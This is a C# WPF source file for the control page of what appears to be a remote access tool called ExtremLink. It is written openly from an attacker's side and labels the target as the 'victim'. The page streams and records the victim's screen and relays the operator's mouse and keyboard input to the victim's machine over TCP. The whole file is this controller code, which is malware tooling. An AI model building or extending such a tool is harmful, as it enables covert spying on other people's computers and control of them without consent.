using ExtremLink_Client_v2.Classes;
using OpenCvSharp;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Media.TextFormatting;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace ExtremLink_Client_v2.Pages
{
    /// <summary>
    /// Interaction logic for ControlPage.xaml
    /// </summary>
    public partial class ControlPage : UserControl
    {

        // Attirbutes:
        private ContentControl contentMain;

        private IList<AttackerSession> sessions;
        private Thread recordingThread;

        private bool isReceivingFrames;
        private bool isRecordingFrame;

        public ControlPage(ContentControl contentMain)
        {
            this.sessions = new List<AttackerSession>();
            this.contentMain = contentMain;
            this.isReceivingFrames = false;
            this.isRecordingFrame = false;
            InitializeComponent();
            clientIpTextBlock.Text = $"Victim's IP: {Attacker.AttackerInstance.VictimIpAddr}";
        }

        private void PlayBtn_Click(object sender, RoutedEventArgs e)
        {
            Attacker.AttackerInstance.SendTCPMessageToClient("&", "StartSendFrames");
            this.isReceivingFrames = true;
            Thread.Sleep(3000);
            this.UpdateFrame();
        }
        private void PauseBtn_Click(object sender, RoutedEventArgs e)
        {
            Attacker.AttackerInstance.SendTCPMessageToClient("&", "PauseSendFrames");
            this.isReceivingFrames = false;
            this.LoadDefaultFrame();
        }
        private void StopBtn_Click(object sender, RoutedEventArgs e)
        {
            Attacker.AttackerInstance.SendTCPMessageToClient("&", "StopSendFrames");
            this.isReceivingFrames = false;
            this.LoadDefaultFrame();
        }
        private void RecordBtn_Click(object sender, RoutedEventArgs e)
        {
            if (!this.isRecordingFrame && this.isReceivingFrames)
            {
                this.recordingStatusTextBlock.Text = "Record: on";
                this.isRecordingFrame = true;
                this.Record();
            }
            else
            {
                this.recordingStatusTextBlock.Text = "Record: off";
                this.isRecordingFrame = false;
            }
        }


        // Frames functions:
        private BitmapImage LoadFrameFromFile()
        {
            try
            {
                return Attacker.AttackerInstance.GetBitmapImageFromPNGFile(Attacker.AttackerInstance.TempPngFileName);
            }
            catch
            {
                return null;
            }
        }
        private async void UpdateFrame()
        {

            while (this.isReceivingFrames)
            {
                try
                {
                    if (this.LoadFrameFromFile() != null)
                    {
                        BitmapImage tempFrame = this.LoadFrameFromFile();
                        await Dispatcher.InvokeAsync(() => frameImg.Source = tempFrame);

                        if (this.sessions.Count > 0)
                        {
                            // Check for adding frames to the session
                            if (this.isReceivingFrames && this.isRecordingFrame)
                            {
                                this.sessions[this.sessions.Count - 1].WriteFrame(tempFrame);
                            }

                            // Check for closing the session
                            if (!this.isRecordingFrame && this.sessions[this.sessions.Count - 1].IsActive)
                            {
                                this.sessions[this.sessions.Count - 1].Stop();
                            }
                        }
                    }
                    // Set the sleep function so the frame rate will be around ~30 FPS
                    await Task.Delay(32);

                    if (!this.isReceivingFrames)
                    {
                        break;
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Error updating frame: {ex.Message}");
                    this.isReceivingFrames = false;
                }
            }
        }

        private void LoadDefaultFrame()
        {
            // Input: Nothing.
            // Output: The function loads the defualt non frame image.
            Dispatcher.InvokeAsync(() => frameImg.Source = new BitmapImage(new Uri("\\Images\\default_image.png", UriKind.RelativeOrAbsolute)));
        }

        private async void Record()
        {
            // Input: Nothing.
            // Output: The function records sessions.
            AttackerSession record = new AttackerSession(800, 450);
            this.sessions.Add(record);
            this.sessions[this.sessions.Count - 1].Start();

            while (this.isReceivingFrames && this.isRecordingFrame)
            {
                this.sessions[this.sessions.Count - 1].WriteFrame(this.LoadFrameFromFile());
                await Task.Delay(1000);
            }
            this.sessions[this.sessions.Count - 1].Stop();
        }


        // Mouse functions:
        private void FrameImg_MouseMove(object sender, MouseEventArgs e)
        {
            // Input: nothing
            // Output: The function updates the mouse's coordinates sends them the client as a query.
            if (this.isReceivingFrames)
            {
                CustomMouseAttacker.CustomMouseInstance.ChangePosition(e.GetPosition(frameImg));
                CustomMouseAttacker.CustomMouseInstance.SendMouseCommands(AttackerMouseCommands.Move);
            }
        }
        private void FrameImg_MouseDown(object sender, MouseButtonEventArgs e)
        {
            // Input: nothing
            // Output: The function sends the client as a query about pressing on one of the mouse buttons(left ot right).
            if (this.isReceivingFrames)
            {
                CustomMouseAttacker.CustomMouseInstance.ChangePosition(e.GetPosition(frameImg));
                if (e.ChangedButton == MouseButton.Left)
                {
                    CustomMouseAttacker.CustomMouseInstance.SendMouseCommands(AttackerMouseCommands.LeftPress);
                }
                if (e.ChangedButton == MouseButton.Right)
                {
                    CustomMouseAttacker.CustomMouseInstance.SendMouseCommands(AttackerMouseCommands.RightPress);
                }
            }
        }

        // Keyboard functions:
        private void FrameImg_KeyboardKeyDown(object sender, KeyEventArgs e)
        {
            // Input: Nothing.
            // Output: The function getting keyboard key and sending it to the client
            Key pressedKey = e.Key;
            CustomKeyboardAttacker.CustomKeyboardInstance.SendKeyboardCommands(pressedKey);
        }
    }
}